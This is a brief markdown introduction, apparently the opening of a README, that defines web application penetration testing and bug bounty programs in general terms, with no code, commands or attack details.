# Web APP Penetration Testing (Bug Bounty)

Web application penetration testing is a security assessment performed on a web application to identify
vulnerabilities and weaknesses that could be exploited by attackers. It involves simulating real-world
attacks to uncover potential security flaws.

Bug bounty programs, on the other hand, are initiatives offered by organizations to incentivize security
researchers and ethical hackers to find and report vulnerabilities in their web applications.
These programs provide rewards or bounties to individuals who discover and responsibly disclose
security issues.
